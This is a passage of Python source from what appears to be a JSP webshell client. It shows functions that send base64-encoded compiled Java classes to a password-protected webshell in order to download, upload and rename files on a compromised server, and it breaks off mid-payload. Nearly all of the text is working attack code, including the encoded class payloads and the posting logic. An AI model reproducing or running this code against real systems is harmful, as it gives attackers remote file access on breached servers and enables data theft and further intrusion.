    payload = 'yv66vgAAADQBNgoAQwCjBwCkCgACAKUKAAIApggApwkAVgCoCACpCQBWAKoIAKsJAFYArAcArQgArgoACwCvCACwCACxCACyCACzCwC0ALULALYAtwsAtAC3BwC4CgAVAKMLALYAuQoAFQC6CgAVALsKAFYAvAoAVgC9CgALAL4HAL8KAFYAwAoACwC7CgACAMEKAMIAwwcAxAgAxQoAIgC7CADGCgAnAMcHAMgKACcAyQoAJwDKCgDLAMwKACcAzQgAzggAzwoAJwDQBwDRCgAnANIKAC8A0woAJwDUCgAnANUKABUA1ggA1woALwDYCADZCgAvANoIANsKANwA3QgA3goAJwDfCADgCgBAAOEIAOIHAOMHAOQKAEAA5QcA5goA5wDoCgBDAOkIAIMHAI4IAOoKAEAA6woA7ADtCADuCwAdAO8LAB0A8AcA8QcA8goATwCvCgBOAPMKAPQA9QoATgD2CgD0APcKAE4A9wcA+AEAB2VuY29kZXIBABJMamF2YS9sYW5nL1N0cmluZzsBAAJjcwEADHJhbmRvbVByZWZpeAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTEluZm87AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQACZWMBAAJleAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAW8BABJMamF2YS9sYW5nL09iamVjdDsBAAtwYWdlQ29udGV4dAEAH0xqYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dDsBAAdyZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAANzYjIBAANzdHIBAARzdHIyAQABcwEADVN0YWNrTWFwVGFibGUHAPgHAOYHAKQHAPkHAPoHAK0HAMgHAMQBAAJFQwEASihMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQACczIBAAtjaGFyc2V0TmFtZQEACkV4Y2VwdGlvbnMBAAZkZWNvZGUBAAFpAQABSQEAAnM0AQAVYnl0ZUFycmF5T3V0cHV0U3RyZWFtAQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEABnN0cmluZwEAB2Zvck5hbWUBABFMamF2YS9sYW5nL0NsYXNzOwEABmludm9rZQEABWJ5dGVzAQACW0IBAAhpbnN0YW5jZQEAAnMzAQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47BwDRAQAQRG93bmxvYWRGaWxlQ29kZQEAPShMamF2YS9sYW5nL1N0cmluZztMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAARuYW1lAQATaHR0cFNlcnZsZXRSZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAFiAQAMb3V0cHV0U3RyZWFtAQAjTGphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbTsBABNidWZmZXJlZElucHV0U3RyZWFtAQAdTGphdmEvaW8vQnVmZmVyZWRJbnB1dFN0cmVhbTsBAARyZWFkBwD7BwDxAQAKU291cmNlRmlsZQEACUluZm8uamF2YQwAWwBcAQAdamF2YXgvc2VydmxldC9qc3AvUGFnZUNvbnRleHQMAPwA/QwA/gD/AQABOAwAWgBYAQAGYmFzZTY0DABXAFgBAARVVEY4DABZAFgBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQAADABbAQABAAgtLS0tLS0+fAEACHw8LS0tLS0tAQAIYXJncGF0aD0BAAl0ZXh0L2h0bWwHAPoMAQEBAAcA+QwBAgEAAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAQMBBAwBBQEGDAEHAQgMAIMAfwwAfgB/DAEFAQkBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQwAlACVDAEKAQsHAQwMAQ0BAAEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAlFUlJPUjovLyABAANoZXgMAGIAYwEAEGphdmEvbGFuZy9TdHJpbmcMAQ4BDwwAWwEQBwERDAESARMMARQBFQEABG51bGwBABAwMTIzNDU2Nzg5QUJDREVGDAEWAQgBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBFwEYDABbARkMARoBGwwBHAEdDAEFAR4BAAEsDAEfARkBAAVVVEYtOAwBBwEEAQAMamF2YS52ZXJzaW9uBwEgDAEhAQQBAAMxLjkMASIBEwEAEGphdmEudXRpbC5CYXNlNjQMAIoBIwEACmdldERlY29kZXIBAA9qYXZhL2xhbmcvQ2xhc3MBABJbTGphdmEvbGFuZy9DbGFzczsMASQBJQEAEGphdmEvbGFuZy9PYmplY3QHASYMAIwBJwwBKAEpAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgwBKgErBwEsDAEtAS4BAAxkZWNvZGVCdWZmZXIMAS8AXAwBMAExAQAbamF2YS9pby9CdWZmZXJlZElucHV0U3RyZWFtAQAXamF2YS9pby9GaWxlSW5wdXRTdHJlYW0MAFsBMgcA+wwBHwEzDACeATQMATUAXAEABEluZm8BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW0BAApnZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAISgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADnNldENvbnRlbnRUeXBlAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEABmdldE91dAEAHygpTGphdmF4L3NlcnZsZXQvanNwL0pzcFdyaXRlcjsBABtqYXZheC9zZXJ2bGV0L2pzcC9Kc3BXcml0ZXIBAAVwcmludAEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL0ludGVnZXIBAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAGbGVuZ3RoAQADKClJAQAEKEkpVgEABmNoYXJBdAEABChJKUMBAAdpbmRleE9mAQAEKEkpSQEAHChJKUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAV3cml0ZQEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEACWNvbXBhcmVUbwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAWZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAVyZXNldAEAD2dldE91dHB1dFN0cmVhbQEAJSgpTGphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAcoW0JJSSlWAQAHKFtCSUkpSQEABWNsb3NlACEAVgBDAAAAAwABAFcAWAAA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'
    payload = b64encode(b64decode(payload).replace('------>|'.encode(), ra.encode()).replace('|<------'.encode(), rb.encode()).replace('argpath='.encode(), rc.encode()))

    b64dir = rd + b64encode(filePath.encode()).decode()
    postArg = {password: payload, rc:b64dir}

    return requestAndResponse(url, postArg, ra, rb)

def uploadFile(url, password, buffer, filePath):
    buffer = buffer.encode().hex()
    ra, rb, rc, rd, ree, rf = genRandomStr(6)
    payload = 'yv66vgAAADQBKgoAQwCeBwCfCgACAKAKAAIAoQgAogkAVACjCACkCQBUAKUIAKYJAFQApwcAqAgAqQoACwCqCACrCACsCACtCACuCACvCwCwALELALIAswsAsACzBwC0CgAWAJ4LALIAtQoAFgC2CgAWALcKAFQAuAoAVAC5CgALALoKAFQAuwoACwC3CgACALwKAL0AvgcAvwgAwAoAIgC3CADBCgAnAMIHAMMKACcAxAoAJwDFCgDGAMcKACcAyAgAyQgAygoAJwDLBwDMCgAnAM0KAC8AzgoAJwDPCgAnANAKABYA0QgA0goALwDTCADUCgAvANUIANYKANcA2AgA2QoAJwDaCADbCgBAANwIAN0HAN4HAN8KAEAA4AcA4QoA4gDjCgBDAOQIAIIHAI0IAOUKAEAA5goA5wDoCADpBwDqCgBMAKoKAEwA6wcA7AoATwDtCgBPANMKAE8A7ggA7wcA8AEAB2VuY29kZXIBABJMamF2YS9sYW5nL1N0cmluZzsBAAJjcwEADHJhbmRvbVByZWZpeAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTEluZm87AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQACZWMBAANlYzIBAAJleAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAW8BABJMamF2YS9sYW5nL09iamVjdDsBAAtwYWdlQ29udGV4dAEAH0xqYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dDsBAAdyZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAANzYjIBAANzdHIBAARzdHIyAQABcwEAAnMyAQANU3RhY2tNYXBUYWJsZQcA8AcA4QcAnwcA8QcA8gcAqAcAwwcAvwEAAkVDAQBKKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAtjaGFyc2V0TmFtZQEACkV4Y2VwdGlvbnMBAAZkZWNvZGUBAAFpAQABSQEAAnM0AQAVYnl0ZUFycmF5T3V0cHV0U3RyZWFtAQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEABnN0cmluZwEAB2Zvck5hbWUBABFMamF2YS9sYW5nL0NsYXNzOwEABmludm9rZQEABWJ5dGVzAQACW0IBAAhpbnN0YW5jZQEAAnMzAQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47BwDMAQAOVXBsb2FkRmlsZUNvZGUBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACHBhdGhuYW1lAQAEZmlsZQEADkxqYXZhL2lvL0ZpbGU7AQAQZmlsZU91dHB1dFN0cmVhbQEAGkxqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW07BwDqBwDsAQAKU291cmNlRmlsZQEACUluZm8uamF2YQwAWQBaAQAdamF2YXgvc2VydmxldC9qc3AvUGFnZUNvbnRleHQMAPMA9AwA9QD2AQABOAwAWABWAQAGYmFzZTY0DABVAFYBAARVVEY4DABXAFYBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQAADABZAPcBAAgtLS0tLS0+fAEACHw8LS0tLS0tAQAIYXJncGF0aD0BAAhhcmdjb250PQEACXRleHQvaHRtbAcA8gwA+AD3BwDxDAD5APcBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwA+gD7DAD8AP0MAP4A/wwAggB/DAB+AH8MAPwBAAwAkwCUDAEBAQIHAQMMAQQA9wEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAlFUlJPUjovLyABAANoZXgMAGAAYQEAEGphdmEvbGFuZy9TdHJpbmcMAQUBBgwAWQEHBwEIDAEJAQoMAQsBDAEABG51bGwBABAwMTIzNDU2Nzg5QUJDREVGDAENAP8BAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBDgEPDABZARAMAREBEgwBEwEUDAD8ARUBAAEsDAEWARABAAVVVEYtOAwA/gD7AQAMamF2YS52ZXJzaW9uBwEXDAEYAPsBAAMxLjkMARkBCgEAEGphdmEudXRpbC5CYXNlNjQMAIkBGgEACmdldERlY29kZXIBAA9qYXZhL2xhbmcvQ2xhc3MBABJbTGphdmEvbGFuZy9DbGFzczsMARsBHAEAEGphdmEvbGFuZy9PYmplY3QHAR0MAIsBHgwBHwEgAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgwBIQEiBwEjDAEkASUBAAxkZWNvZGVCdWZmZXIBAAxqYXZhL2lvL0ZpbGUMASYBJwEAGGphdmEvaW8vRmlsZU91dHB1dFN0cmVhbQwAWQEoDAEpAFoBAAExAQAESW5mbwEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEACmdldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAC2dldFJlc3BvbnNlAQAhKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAOc2V0Q29udGVudFR5cGUBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAGZ2V0T3V0AQAfKClMamF2YXgvc2VydmxldC9qc3AvSnNwV3JpdGVyOwEAG2phdmF4L3NlcnZsZXQvanNwL0pzcFdyaXRlcgEABXByaW50AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvSW50ZWdlcgEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAZsZW5ndGgBAAMoKUkBAAQoSSlWAQAGY2hhckF0AQAEKEkpQwEAB2luZGV4T2YBAAQoSSlJAQAcKEkpTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEABXdyaXRlAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAJY29tcGFyZVRvAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABZnZXREZWNsYXJlZENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWNyZWF0ZU5ld0ZpbGUBAAMoKVoBABIoTGphdmEvaW8vRmlsZTtaKVYBAAVjbG9zZQAhAFQAQwAAAAMAAQBVAFYAAAABAFcAVgAAAAEAWABWAAAABQABAFkAWgABAFsAAAAvAAEAAQAAAAUqtwABsQAAAAIAXAAAAAYAAQAAAAkAXQAAAAwAAQAAAAUAXgBfAAAAAQBgAGEAAQBbAAACcwAFAA0AAAEnK8AAAk0stgADTiy2AAQ6BCoSBbUABioSB7UACCoSCbUACrsAC1kSDLcADToFuwALWRIMtwANOgYSDjoHEg86CBIQOgkSEToKGQQSErkAEwIALSq0AAq5ABQCABkEKrQACrkAFQIAKiq7ABZZtwAXLRIQuQAYAgC2ABkSDLYAGbYAGiq0AAgqtAAKtgAbKrQACCq0AAq2ABw6CyoquwAWWbcAFy0SEbkAGAIAtgAZEgy2ABm2ABoq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'
    payload = b64encode(b64decode(payload).replace('------>|'.encode(), ra.encode()).replace('|<------'.encode(), rb.encode()).replace('argpath='.encode(), rc.encode()).replace('argcont='.encode(), rd.encode()))

    b64dir = ree + b64encode(filePath.encode()).decode()
    b64buff = rf + b64encode(buffer.encode()).decode()
    postArg = {password : payload, rc : b64dir, rd : b64buff}

    return requestAndResponse(url, postArg, ra, rb)


def renameFile(url, password, src, dst):
    ra, rb, rc, rd, ree, rf = genRandomStr(6)
    payload = 'yv66vgAAADQBHAoAQwCVBwCWCgACAJcKAAIAmAgAmQkAUACaCACbCQBQAJwIAJ0JAFAAngcAnwgAoAoACwChCACiCACjCACkCAClCACmCwCnAKgLAKkAqgsApwCqBwCrCgAWAJULAKkArAoAFgCtCgAWAK4KAFAArwoAUACwCgALALEKAFAAsgoACwCuCgACALMKALQAtQcAtggAtwoAIgCuCAC4CgAnALkHALoKACcAuwoAJwC8CgC9AL4KACcAvwgAwAgAwQoAJwDCBwDDCgAnAMQKAC8AxQoAJwDGCgAnAMcKABYAyAgAyQoALwDKCADLCgAvAMwIAM0KAM4AzwgA0AoAJwDRCADSCgBAANMIANQHANUHANYKAEAA1wcA2AoA2QDaCgBDANsIAH4HAIkIANwKAEAA3QoA3gDfCADgBwDhCgBMAKEKAEwA4ggA4wcA5AEAB2VuY29kZXIBABJMamF2YS9sYW5nL1N0cmluZzsBAAJjcwEADHJhbmRvbVByZWZpeAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTEluZm87AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQACZWMBAANlYzIBAAJleAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAW8BABJMamF2YS9sYW5nL09iamVjdDsBAAtwYWdlQ29udGV4dAEAH0xqYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dDsBAAdyZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAANzYjIBAANzdHIBAARzdHIyAQABcwEAAnMyAQANU3RhY2tNYXBUYWJsZQcA5AcA2AcAlgcA5QcA5gcAnwcAugcAtgEAAkVDAQBKKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAtjaGFyc2V0TmFtZQEACkV4Y2VwdGlvbnMBAAZkZWNvZGUBAAFpAQABSQEAAnM0AQAVYnl0ZUFycmF5T3V0cHV0U3Ry